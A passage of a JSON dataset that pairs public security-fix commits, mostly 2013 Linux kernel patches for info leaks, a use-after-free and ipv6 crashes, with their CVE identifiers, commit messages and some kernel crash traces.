    "body": "The current default perf paranoid level is \"1\" which has\"perf_paranoid_kernel()\" return false, and giving any operations thatuse it, access to normal users. Unfortunately, this includes functiontracing and normal users should not be allowed to enable functiontracing by default.The proper level is defined at \"-1\" (full perf access), which\"perf_paranoid_tracepoint_raw()\" will only give access to. Use thatcheck instead for enabling function tracing.Reported-by: Dave Jones <davej@redhat.com>Reported-by: Vince Weaver <vincent.weaver@maine.edu>Tested-by: Vince Weaver <vincent.weaver@maine.edu>Cc: Peter Zijlstra <peterz@infradead.org>Cc: Ingo Molnar <mingo@kernel.org>Cc: Jiri Olsa <jolsa@redhat.com>Cc: Frederic Weisbecker <fweisbec@gmail.com>Cc: stable@vger.kernel.org # 3.4+CVE: CVE-2013-2930Fixes: ced3900 (\"ftrace, perf: Add support to use function tracepoint in perf\")Signed-off-by: Steven Rostedt <rostedt@goodmis.org>",
    "cveIds": [
      "CVE-2013-2930"
    ],
    "cveIdsCount": 1
  },
  "01ff179f5436abb6c1452b376b3e15b9bf113ef42c5a508ae21d9e20da6cc078": {
    "url": "https://github.com/torvalds/linux/commit/72a763d805a48ac8c0bf48fdb510e84c12de51fe",
    "title": "crypto: algif - suppress sending source address information in recvmsg",
    "body": "The current code does not set the msg_namelen member to 0 and thereforemakes net/socket.c leak the local sockaddr_storage variable to userland-- 128 bytes of kernel stack memory. Fix that.Cc: <stable@vger.kernel.org> # 2.6.38Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2013-3076"
    ],
    "cveIdsCount": 1
  },
  "a0465c73b0962c95b9ea7cc362d5e1d30d14929bb424939acc81c6e1f4d86425": {
    "url": "https://github.com/torvalds/linux/commit/9b3e617f3df53822345a8573b6d358f6b9e5ed87",
    "title": "atm: update msg_namelen in vcc_recvmsg()",
    "body": "The current code does not fill the msg_name member in case it is set.It also does not set the msg_namelen member to 0 and therefore makesnet/socket.c leak the local, uninitialized sockaddr_storage variableto userland -- 128 bytes of kernel stack memory.Fix that by simply setting msg_namelen to 0 as obviously nobody caredabout vcc_recvmsg() not filling the msg_name in case it was set.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3222"
    ],
    "cveIdsCount": 1
  },
  "a1a48035003eebd422bca6a5126daceb1eaf1ad292bc73ad5d7dae2732724efd": {
    "url": "https://github.com/torvalds/linux/commit/ef3313e84acbf349caecae942ab3ab731471f1a1",
    "title": "ax25: fix info leak via msg_name in ax25_recvmsg()",
    "body": "When msg_namelen is non-zero the sockaddr info gets filled out, asrequested, but the code fails to initialize the padding bytes of structsockaddr_ax25 inserted by the compiler for alignment. Additionally themsg_namelen value is updated to sizeof(struct full_sockaddr_ax25) but isnot always filled up to this size.Both issues lead to the fact that the code will leak uninitializedkernel stack bytes in net/socket.c.Fix both issues by initializing the memory with memset(0).Cc: Ralf Baechle <ralf@linux-mips.org>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3223"
    ],
    "cveIdsCount": 1
  },
  "3669e239b4825a450afcff61802485cc7f36a17bb17fdba153363c1607342311": {
    "url": "https://github.com/torvalds/linux/commit/4683f42fde3977bdb4e8a09622788cc8b5313778",
    "title": "Bluetooth: fix possible info leak in bt_sock_recvmsg()",
    "body": "In case the socket is already shutting down, bt_sock_recvmsg() returnswith 0 without updating msg_namelen leading to net/socket.c leaking thelocal, uninitialized sockaddr_storage variable to userland -- 128 bytesof kernel stack memory.Fix this by moving the msg_namelen assignment in front of the shutdowntest.Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3224"
    ],
    "cveIdsCount": 1
  },
  "0f98702fb1c6276142b706a8dbfdec0e706ec89099e7b5b1d502599d56187c65": {
    "url": "https://github.com/torvalds/linux/commit/e11e0455c0d7d3d62276a0c55d9dfbc16779d691",
    "title": "Bluetooth: RFCOMM - Fix missing msg_namelen update in rfcomm_sock_rec…",
    "body": "…vmsg()If RFCOMM_DEFER_SETUP is set in the flags, rfcomm_sock_recvmsg() returnsearly with 0 without updating the possibly set msg_namelen member. This,in turn, leads to a 128 byte kernel stack leak in net/socket.c.Fix this by updating msg_namelen in this case. For all other cases itwill be handled in bt_sock_stream_recvmsg().Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3225"
    ],
    "cveIdsCount": 1
  },
  "c4f2a7f2991e48e0b80bf941b537a67f97fd58ea2398860dc8d6d2986e3f035f": {
    "url": "https://github.com/torvalds/linux/commit/c8c499175f7d295ef867335bceb9a76a2c3cdc38",
    "title": "Bluetooth: SCO - Fix missing msg_namelen update in sco_sock_recvmsg()",
    "body": "If the socket is in state BT_CONNECT2 and BT_SK_DEFER_SETUP is set inthe flags, sco_sock_recvmsg() returns early with 0 without updating thepossibly set msg_namelen member. This, in turn, leads to a 128 bytekernel stack leak in net/socket.c.Fix this by updating msg_namelen in this case. For all other cases itwill be handled in bt_sock_recvmsg().Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3226"
    ],
    "cveIdsCount": 1
  },
  "36f1f5d64e7e55f1c8a61e26a4d62486a6629dea51f1ff78d0444d2d18be7ace": {
    "url": "https://github.com/torvalds/linux/commit/2d6fbfe733f35c6b355c216644e08e149c61b271",
    "title": "caif: Fix missing msg_namelen update in caif_seqpkt_recvmsg()",
    "body": "The current code does not fill the msg_name member in case it is set.It also does not set the msg_namelen member to 0 and therefore makesnet/socket.c leak the local, uninitialized sockaddr_storage variableto userland -- 128 bytes of kernel stack memory.Fix that by simply setting msg_namelen to 0 as obviously nobody caredabout caif_seqpkt_recvmsg() not filling the msg_name in case it wasset.Cc: Sjur Braendeland <sjur.brandeland@stericsson.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3227"
    ],
    "cveIdsCount": 1
  },
  "80200e1ee6e5ccb9ebf4d76f06435986665ea7fa1e89fad0c9d6bbe7e993a2fc": {
    "url": "https://github.com/torvalds/linux/commit/5ae94c0d2f0bed41d6718be743985d61b7f5c47d",
    "title": "irda: Fix missing msg_namelen update in irda_recvmsg_dgram()",
    "body": "The current code does not fill the msg_name member in case it is set.It also does not set the msg_namelen member to 0 and therefore makesnet/socket.c leak the local, uninitialized sockaddr_storage variableto userland -- 128 bytes of kernel stack memory.Fix that by simply setting msg_namelen to 0 as obviously nobody caredabout irda_recvmsg_dgram() not filling the msg_name in case it wasset.Cc: Samuel Ortiz <samuel@sortiz.org>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3228"
    ],
    "cveIdsCount": 1
  },
  "3ccaa3512ddd3658cd27ff2a4801401a487b15ee6c5411a5e5d6d4b6243df52b": {
    "url": "https://github.com/torvalds/linux/commit/a5598bd9c087dc0efc250a5221e5d0e6f584ee88",
    "title": "iucv: Fix missing msg_namelen update in iucv_sock_recvmsg()",
    "body": "The current code does not fill the msg_name member in case it is set.It also does not set the msg_namelen member to 0 and therefore makesnet/socket.c leak the local, uninitialized sockaddr_storage variableto userland -- 128 bytes of kernel stack memory.Fix that by simply setting msg_namelen to 0 as obviously nobody caredabout iucv_sock_recvmsg() not filling the msg_name in case it was set.Cc: Ursula Braun <ursula.braun@de.ibm.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3229"
    ],
    "cveIdsCount": 1
  },
  "d6acf598db01b4a641cae4abd15ad5af1e19ffe374b413774752b0b02ced8874": {
    "url": "https://github.com/torvalds/linux/commit/b860d3cc62877fad02863e2a08efff69a19382d2",
    "title": "l2tp: fix info leak in l2tp_ip6_recvmsg()",
    "body": "The L2TP code for IPv6 fails to initialize the l2tp_conn_id member ofstruct sockaddr_l2tpip6 and therefore leaks four bytes kernel stackin l2tp_ip6_recvmsg() in case msg_name is set.Initialize l2tp_conn_id with 0 to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3230"
    ],
    "cveIdsCount": 1
  },
  "0c2f5f97d089e1b918c8cb6d37acd3017c5ede8f212f49b5c8758ce44c016f03": {
    "url": "https://github.com/torvalds/linux/commit/c77a4b9cffb6215a15196ec499490d116dfad181",
    "title": "llc: Fix missing msg_namelen update in llc_ui_recvmsg()",
    "body": "For stream sockets the code misses to update the msg_namelen memberto 0 and therefore makes net/socket.c leak the local, uninitializedsockaddr_storage variable to userland -- 128 bytes of kernel stackmemory. The msg_namelen update is also missing for datagram socketsin case the socket is shutting down during receive.Fix both issues by setting msg_namelen to 0 early. It will beupdated later if we're going to fill the msg_name member.Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3231"
    ],
    "cveIdsCount": 1
  },
  "2c02c8fc8f7f664bf08d31a68374f75223db9cf76d64eb906fa892bbf40c9f9e": {
    "url": "https://github.com/torvalds/linux/commit/3ce5efad47b62c57a4f5c54248347085a750ce0e",
    "title": "netrom: fix info leak via msg_name in nr_recvmsg()",
    "body": "In case msg_name is set the sockaddr info gets filled out, asrequested, but the code fails to initialize the padding bytes ofstruct sockaddr_ax25 inserted by the compiler for alignment. Alsothe sax25_ndigis member does not get assigned, leaking four morebytes.Both issues lead to the fact that the code will leak uninitializedkernel stack bytes in net/socket.c.Fix both issues by initializing the memory with memset(0).Cc: Ralf Baechle <ralf@linux-mips.org>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3232"
    ],
    "cveIdsCount": 1
  },
  "d4a1829f31c31345734745432bee389026ea7f01637e00556c63213463a61333": {
    "url": "https://github.com/torvalds/linux/commit/c802d759623acbd6e1ee9fbdabae89159a513913",
    "title": "netrom: fix invalid use of sizeof in nr_recvmsg()",
    "body": "sizeof() when applied to a pointer typed expression gives the size of thepointer, not that of the pointed data.Introduced by commit 3ce5ef(netrom: fix info leak via msg_name in nr_recvmsg)Signed-off-by: Wei Yongjun <yongjun_wei@trendmicro.com.cn>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3232"
    ],
    "cveIdsCount": 1
  },
  "559810e07e1f2ea2c3424f8162b35569b9e8e7a10d4dc42a06a38636d9baa6ba": {
    "url": "https://github.com/torvalds/linux/commit/d26d6504f23e803824e8ebd14e52d4fc0a0b09cb",
    "title": "NFC: llcp: fix info leaks via msg_name in llcp_sock_recvmsg()",
    "body": "The code in llcp_sock_recvmsg() does not initialize all the members ofstruct sockaddr_nfc_llcp when filling the sockaddr info. Nor does itinitialize the padding bytes of the structure inserted by the compilerfor alignment.Also, if the socket is in state LLCP_CLOSED or is shutting down duringreceive the msg_namelen member is not updated to 0 while otherwisereturning with 0, i.e. \"success\". The msg_namelen update is alsomissing for stream and seqpacket sockets which don't fill the sockaddrinfo.Both issues lead to the fact that the code will leak uninitializedkernel stack bytes in net/socket.c.Fix the first issue by initializing the memory used for sockaddr infowith memset(0). Fix the second one by setting msg_namelen to 0 early.It will be updated later if we're going to fill the msg_name member.Cc: Lauro Ramos Venancio <lauro.venancio@openbossa.org>Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org>Cc: Samuel Ortiz <sameo@linux.intel.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3233"
    ],
    "cveIdsCount": 1
  },
  "7794ca4b63fb0cfe027f8fb1ebc03fe99fc859a15e6257604de93ad7e71992c0": {
    "url": "https://github.com/torvalds/linux/commit/4a184233f21645cf0b719366210ed445d1024d72",
    "title": "rose: fix info leak via msg_name in rose_recvmsg()",
    "body": "The code in rose_recvmsg() does not initialize all of the members ofstruct sockaddr_rose/full_sockaddr_rose when filling the sockaddr info.Nor does it initialize the padding bytes of the structure inserted bythe compiler for alignment. This will lead to leaking uninitializedkernel stack bytes in net/socket.c.Fix the issue by initializing the memory used for sockaddr info withmemset(0).Cc: Ralf Baechle <ralf@linux-mips.org>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3234"
    ],
    "cveIdsCount": 1
  },
  "665269bf97cb98f9e05d90e7cfe54a956bc6f9e7ae35e27088c1439748a20993": {
    "url": "https://github.com/torvalds/linux/commit/60085c3d009b0df252547adb336d1ccca5ce52ec",
    "title": "tipc: fix info leaks via msg_name in recv_msg/recv_stream",
    "body": "The code in set_orig_addr() does not initialize all of the members ofstruct sockaddr_tipc when filling the sockaddr info -- namely the unionis only partly filled. This will make recv_msg() and recv_stream() --the only users of this function -- leak kernel stack memory as themsg_name member is a local variable in net/socket.c.Additionally to that both recv_msg() and recv_stream() fail to updatethe msg_namelen member to 0 while otherwise returning with 0, i.e.\"success\". This is the case for, e.g., non-blocking sockets. This willlead to a 128 byte kernel stack leak in net/socket.c.Fix the first issue by initializing the memory of the union withmemset(0). Fix the second one by setting msg_namelen to 0 early as itwill be updated later if we're going to fill the msg_name member.Cc: Jon Maloy <jon.maloy@ericsson.com>Cc: Allan Stephens <allan.stephens@windriver.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3235"
    ],
    "cveIdsCount": 1
  },
  "eb9649372ab257b1d32eb972fa206a3f8325ee90d01beff5eb360de824322111": {
    "url": "https://github.com/torvalds/linux/commit/680d04e0ba7e926233e3b9cee59125ce181f66ba",
    "title": "VSOCK: vmci - fix possible info leak in vmci_transport_dgram_dequeue()",
    "body": "In case we received no data on the call to skb_recv_datagram(), i.e.skb->data is NULL, vmci_transport_dgram_dequeue() will return with 0without updating msg_namelen leading to net/socket.c leaking the local,uninitialized sockaddr_storage variable to userland -- 128 bytes ofkernel stack memory.Fix this by moving the already existing msg_namelen assignment a fewlines above.Cc: Andy King <acking@vmware.com>Cc: Dmitry Torokhov <dtor@vmware.com>Cc: George Zhang <georgezhang@vmware.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3236"
    ],
    "cveIdsCount": 1
  },
  "7302999aace2784c14bb58c63266fe5327f75460a890d0a21c89c57252be368d": {
    "url": "https://github.com/torvalds/linux/commit/d5e0d0f607a7a029c6563a0470d88255c89a8d11",
    "title": "VSOCK: Fix missing msg_namelen update in vsock_stream_recvmsg()",
    "body": "The code misses to update the msg_namelen member to 0 and thereforemakes net/socket.c leak the local, uninitialized sockaddr_storagevariable to userland -- 128 bytes of kernel stack memory.Cc: Andy King <acking@vmware.com>Cc: Dmitry Torokhov <dtor@vmware.com>Cc: George Zhang <georgezhang@vmware.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-3237"
    ],
    "cveIdsCount": 1
  },
  "5962e34aba744938fd191fcc90c35499d10b91737ebac2655db94e23b9e5acda": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/d3fafdfba0807068196655e9b6d16c5d1d3ccf8a",
    "title": "Security: remove dots in template to avoid a remote code execution vu…",
    "body": "…lnerability",
    "cveIds": [
      "CVE-2013-3239"
    ],
    "cveIdsCount": 1
  },
  "4a75c9e94deb4aa047634d429d5b2d9972b22870714dc7edf258714759e6c76e": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/0773bb9303d24473fe1185d85a424dfe159aff53",
    "title": "nla: invalidate sec handle after creation",
    "body": "If sec pointer isn't invalidated after creation it is not possibleto check if the upper and lower pointers are valid.This fixes a segfault in the server part if the client disconnects beforethe authentication was finished.",
    "cveIds": [
      "CVE-2013-4119"
    ],
    "cveIdsCount": 1
  },
  "02201123d22d6fc6220c25c9606bdf37d6b8d7f9ab753586bbda273f5289c250": {
    "url": "https://github.com/torvalds/linux/commit/307f2fb95e9b96b3577916e73d92e104f8f26494",
    "title": "ipv6: only static routes qualify for equal cost multipathing",
    "body": "Static routes in this case are non-expiring routes which did not getconfigured by autoconf or by icmpv6 redirects.To make sure we actually get an ecmp route while searching for the firstone in this fib6_node's leafs, also make sure it matches the ecmp routeassumptions.v2:a) Removed RTF_EXPIRE check in dst.from chain. The check of RTF_ADDRCONF already ensures that this route, even if added again without RTF_EXPIRES (in case of a RA announcement with infinite timeout), does not cause the rt6i_nsiblings logic to go wrong if a later RA updates the expiration time later.v3:a) Allow RTF_EXPIRES routes to enter the ecmp route set. We have to do so, because an pmtu event could update the RTF_EXPIRES flag and we would not count this route, if another route joins this set. We now filter only for RTF_GATEWAY|RTF_ADDRCONF|RTF_DYNAMIC, which are flags that don't get changed after rt6_info construction.Cc: Nicolas Dichtel <nicolas.dichtel@6wind.com>Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-4125"
    ],
    "cveIdsCount": 1
  },
  "8b73353e7b2e020ef29f987f87440d69f85215fadc96f23d269d9ccb25ed4860": {
    "url": "https://github.com/torvalds/linux/commit/dd7633ecd553a5e304d349aa6f8eb8a0417098c5",
    "title": "vhost-net: fix use-after-free in vhost_net_flush",
    "body": "vhost_net_ubuf_put_and_wait has a confusing name:it will actually also free it's argument.Thus since commit 1280c27 \"vhost-net: flush outstanding DMAs on memory change\"vhost_net_flush tries to use the argument after passing itto vhost_net_ubuf_put_and_wait, this resultsin use after free.To fix, don't free the argument in vhost_net_ubuf_put_and_wait,add an new API for callers that want to free ubufs.Acked-by: Asias He <asias@redhat.com>Acked-by: Jason Wang <jasowang@redhat.com>Signed-off-by: Michael S. Tsirkin <mst@redhat.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-4127"
    ],
    "cveIdsCount": 1
  },
  "d58c36999d7c31551c2bf73609826ed17d0f970c5d3d76bcfd7d5c8e3567b5d5": {
    "url": "https://github.com/torvalds/linux/commit/c7e8e8a8f7a70b343ca1e0f90a31e35ab2d16de1",
    "title": "bridge: fix some kernel warning in multicast timer",
    "body": "Several people reported the warning: \"kernel BUG at kernel/timer.c:729!\"and the stack trace is:#7 [ffff880214d25c10] mod_timer+501 at ffffffff8106d905#8 [ffff880214d25c50] br_multicast_del_pg.isra.20+261 at ffffffffa0731d25 [bridge]#9 [ffff880214d25c80] br_multicast_disable_port+88 at ffffffffa0732948 [bridge]#10 [ffff880214d25cb0] br_stp_disable_port+154 at ffffffffa072bcca [bridge]#11 [ffff880214d25ce8] br_device_event+520 at ffffffffa072a4e8 [bridge]#12 [ffff880214d25d18] notifier_call_chain+76 at ffffffff8164aafc#13 [ffff880214d25d50] raw_notifier_call_chain+22 at ffffffff810858f6#14 [ffff880214d25d60] call_netdevice_notifiers+45 at ffffffff81536aad#15 [ffff880214d25d80] dev_close_many+183 at ffffffff81536d17#16 [ffff880214d25dc0] rollback_registered_many+168 at ffffffff81537f68#17 [ffff880214d25de8] rollback_registered+49 at ffffffff81538101#18 [ffff880214d25e10] unregister_netdevice_queue+72 at ffffffff815390d8#19 [ffff880214d25e30] __tun_detach+272 at ffffffffa074c2f0 [tun]#20 [ffff880214d25e88] tun_chr_close+45 at ffffffffa074c4bd [tun]#21 [ffff880214d25ea8] __fput+225 at ffffffff8119b1f1#22 [ffff880214d25ef0] ____fput+14 at ffffffff8119b3fe#23 [ffff880214d25f00] task_work_run+159 at ffffffff8107cf7f#24 [ffff880214d25f30] do_notify_resume+97 at ffffffff810139e1#25 [ffff880214d25f50] int_signal+18 at ffffffff8164f292this is due to I forgot to check if mp->timer is armed inbr_multicast_del_pg(). This bug is introduced bycommit 9f00b2e (bridge: only expire the mdb entrywhen query is received).Same for __br_mdb_del().Tested-by: poma <pomidorabelisima@gmail.com>Reported-by: LiYonghua <809674045@qq.com>Reported-by: Robert Hancock <hancockrwd@gmail.com>Cc: Herbert Xu <herbert@gondor.apana.org.au>Cc: Stephen Hemminger <stephen@networkplumber.org>Cc: \"David S. Miller\" <davem@davemloft.net>Signed-off-by: Cong Wang <amwang@redhat.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-4129"
    ],
    "cveIdsCount": 1
  },
  "8a060fb52021ee546792d39c13826d5003b980af5b4e557a3c9fb64897820566": {
    "url": "https://github.com/torvalds/linux/commit/8822b64a0fa64a5dd1dfcf837c5b0be83f8c05d1",
    "title": "ipv6: call udp_push_pending_frames when uncorking a socket with AF_IN…",
    "body": "…ET pending dataWe accidentally call down to ip6_push_pending_frames when uncorkingpending AF_INET data on a ipv6 socket. This results in the followingsplat (from Dave Jones):skbuff: skb_under_panic: text:ffffffff816765f6 len:48 put:40 head:ffff88013deb6df0 data:ffff88013deb6dec tail:0x2c end:0xc0 dev:<NULL>------------[ cut here ]------------kernel BUG at net/core/skbuff.c:126!invalid opcode: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOCModules linked in: dccp_ipv4 dccp 8021q garp bridge stp dlci mpoa snd_seq_dummy sctp fuse hidp tun bnep nfnetlink scsi_transport_iscsi rfcomm can_raw can_bcm af_802154 appletalk caif_socket can caif ipt_ULOG x25 rose af_key pppoe pppox ipx phonet irda llc2 ppp_generic slhc p8023 psnap p8022 llc crc_ccitt atm bluetooth+netrom ax25 nfc rfkill rds af_rxrpc coretemp hwmon kvm_intel kvm crc32c_intel snd_hda_codec_realtek ghash_clmulni_intel microcode pcspkr snd_hda_codec_hdmi snd_hda_intel snd_hda_codec snd_hwdep usb_debug snd_seq snd_seq_device snd_pcm e1000e snd_page_alloc snd_timer ptp snd pps_core soundcore xfs libcrc32cCPU: 2 PID: 8095 Comm: trinity-child2 Not tainted 3.10.0-rc7+ #37task: ffff8801f52c2520 ti: ffff8801e6430000 task.ti: ffff8801e6430000RIP: 0010:[<ffffffff816e759c>] [<ffffffff816e759c>] skb_panic+0x63/0x65RSP: 0018:ffff8801e6431de8 EFLAGS: 00010282RAX: 0000000000000086 RBX: ffff8802353d3cc0 RCX: 0000000000000006RDX: 0000000000003b90 RSI: ffff8801f52c2ca0 RDI: ffff8801f52c2520RBP: ffff8801e6431e08 R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000001 R11: 0000000000000001 R12: ffff88022ea0c800R13: ffff88022ea0cdf8 R14: ffff8802353ecb40 R15: ffffffff81cc7800FS: 00007f5720a10740(0000) GS:ffff880244c00000(0000) knlGS:0000000000000000CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033CR2: 0000000005862000 CR3: 000000022843c000 CR4: 00000000001407e0DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600Stack: ffff88013deb6dec 000000000000002c 00000000000000c0 ffffffff81a3f6e4 ffff8801e6431e18 ffffffff8159a9aa ffff8801e6431e90 ffffffff816765f6 ffffffff810b756b 0000000700000002 ffff8801e6431e40 0000fea9292aa8c0Call Trace: [<ffffffff8159a9aa>] skb_push+0x3a/0x40 [<ffffffff816765f6>] ip6_push_pending_frames+0x1f6/0x4d0 [<ffffffff810b756b>] ? mark_held_locks+0xbb/0x140 [<ffffffff81694919>] udp_v6_push_pending_frames+0x2b9/0x3d0 [<ffffffff81694660>] ? udplite_getfrag+0x20/0x20 [<ffffffff8162092a>] udp_lib_setsockopt+0x1aa/0x1f0 [<ffffffff811cc5e7>] ? fget_light+0x387/0x4f0 [<ffffffff816958a4>] udpv6_setsockopt+0x34/0x40 [<ffffffff815949f4>] sock_common_setsockopt+0x14/0x20 [<ffffffff81593c31>] SyS_setsockopt+0x71/0xd0 [<ffffffff816f5d54>] tracesys+0xdd/0xe2Code: 00 00 48 89 44 24 10 8b 87 d8 00 00 00 48 89 44 24 08 48 8b 87 e8 00 00 00 48 c7 c7 c0 04 aa 81 48 89 04 24 31 c0 e8 e1 7e ff ff <0f> 0b 55 48 89 e5 0f 0b 55 48 89 e5 0f 0b 55 48 89 e5 0f 0b 55RIP [<ffffffff816e759c>] skb_panic+0x63/0x65 RSP <ffff8801e6431de8>This patch adds a check if the pending data is of address family AF_INETand directly calls udp_push_ending_frames from udp_v6_push_pending_framesif that is the case.This bug was found by Dave Jones with trinity.(Also move the initialization of fl6 below the AF_INET check, even ifnot strictly necessary.)Cc: Dave Jones <davej@redhat.com>Cc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org>Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-4162"
    ],
    "cveIdsCount": 1
  },
  "096292a3b017ccf9c463f83bd90bde3f1ccc54c90243781fb77f7ed9d6b4cfe2": {
    "url": "https://github.com/torvalds/linux/commit/75a493e60ac4bbe2e977e7129d6d8cbb0dd236be",
    "title": "ipv6: ip6_append_data_mtu did not care about pmtudisc and frag_size",
    "body": "If the socket had an IPV6_MTU value set, ip6_append_data_mtu lost trackof this when appending the second frame on a corked socket. This resultsin the following splat:[37598.993962] ------------[ cut here ]------------[37598.994008] kernel BUG at net/core/skbuff.c:2064![37598.994008] invalid opcode: 0000 [#1] SMP[37598.994008] Modules linked in: tcp_lp uvcvideo videobuf2_vmalloc videobuf2_memops videobuf2_core videodev media vfat fat usb_storage fuse ebtable_nat xt_CHECKSUM bridge stp llc ipt_MASQUERADE nf_conntrack_netbios_ns nf_conntrack_broadcast ip6table_mangle ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 iptable_nat+nf_nat_ipv4 nf_nat iptable_mangle nf_conntrack_ipv4 nf_defrag_ipv4 xt_conntrack nf_conntrack ebtable_filter ebtables ip6table_filter ip6_tables be2iscsi iscsi_boot_sysfs bnx2i cnic uio cxgb4i cxgb4 cxgb3i cxgb3 mdio libcxgbi ib_iser rdma_cm ib_addr iw_cm ib_cm ib_sa ib_mad ib_core iscsi_tcp libiscsi_tcp libiscsi+scsi_transport_iscsi rfcomm bnep iTCO_wdt iTCO_vendor_support snd_hda_codec_conexant arc4 iwldvm mac80211 snd_hda_intel acpi_cpufreq mperf coretemp snd_hda_codec microcode cdc_wdm cdc_acm[37598.994008] snd_hwdep cdc_ether snd_seq snd_seq_device usbnet mii joydev btusb snd_pcm bluetooth i2c_i801 e1000e lpc_ich mfd_core ptp iwlwifi pps_core snd_page_alloc mei cfg80211 snd_timer thinkpad_acpi snd tpm_tis soundcore rfkill tpm tpm_bios vhost_net tun macvtap macvlan kvm_intel kvm uinput binfmt_misc+dm_crypt i915 i2c_algo_bit drm_kms_helper drm i2c_core wmi video[37598.994008] CPU 0[37598.994008] Pid: 27320, comm: t2 Not tainted 3.9.6-200.fc18.x86_64 #1 LENOVO 27744PG/27744PG[37598.994008] RIP: 0010:[<ffffffff815443a5>] [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330[37598.994008] RSP: 0018:ffff88003670da18 EFLAGS: 00010202[37598.994008] RAX: ffff88018105c018 RBX: 0000000000000004 RCX: 00000000000006c0[37598.994008] RDX: ffff88018105a6c0 RSI: ffff88018105a000 RDI: ffff8801e1b0aa00[37598.994008] RBP: ffff88003670da78 R08: 0000000000000000 R09: ffff88018105c040[37598.994008] R10: ffff8801e1b0aa00 R11: 0000000000000000 R12: 000000000000fff8[37598.994008] R13: 00000000000004fc R14: 00000000ffff0504 R15: 0000000000000000[37598.994008] FS: 00007f28eea59740(0000) GS:ffff88023bc00000(0000) knlGS:0000000000000000[37598.994008] CS: 0010 DS: 0000 ES: 0000 CR0: 000000008005003b[37598.994008] CR2: 0000003d935789e0 CR3: 00000000365cb000 CR4: 00000000000407f0[37598.994008] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000[37598.994008] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400[37598.994008] Process t2 (pid: 27320, threadinfo ffff88003670c000, task ffff88022c162ee0)[37598.994008] Stack:[37598.994008] ffff88022e098a00 ffff88020f973fc0 0000000000000008 00000000000004c8[37598.994008] ffff88020f973fc0 00000000000004c4 ffff88003670da78 ffff8801e1b0a200[37598.994008] 0000000000000018 00000000000004c8 ffff88020f973fc0 00000000000004c4[37598.994008] Call Trace:[37598.994008] [<ffffffff815fc21f>] ip6_append_data+0xccf/0xfe0[37598.994008] [<ffffffff8158d9f0>] ? ip_copy_metadata+0x1a0/0x1a0[37598.994008] [<ffffffff81661f66>] ? _raw_spin_lock_bh+0x16/0x40[37598.994008] [<ffffffff8161548d>] udpv6_sendmsg+0x1ed/0xc10[37598.994008] [<ffffffff812a2845>] ? 